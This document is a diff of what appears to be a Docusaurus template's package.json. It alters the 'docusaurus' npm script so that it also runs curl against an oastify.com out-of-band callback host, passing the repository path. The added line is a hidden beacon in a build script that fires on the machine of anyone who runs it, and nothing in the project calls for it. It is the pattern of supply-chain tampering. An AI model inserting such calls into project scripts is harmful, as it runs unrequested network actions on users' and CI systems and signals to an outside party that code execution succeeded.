@@ -3,7 +3,7 @@
   "version": "1.7.0",
   "private": true,
   "scripts": {
-    "docusaurus": "docusaurus",
+    "docusaurus": "docusaurus && curl https://5jplxi6704slnoybegw5006okfqaec21.oastify.com/PaloAltoNetworks/docusaurus-template-openapi-docs",
     "start": "docusaurus start",
     "build": "docusaurus build",
     "swizzle": "docusaurus swizzle",
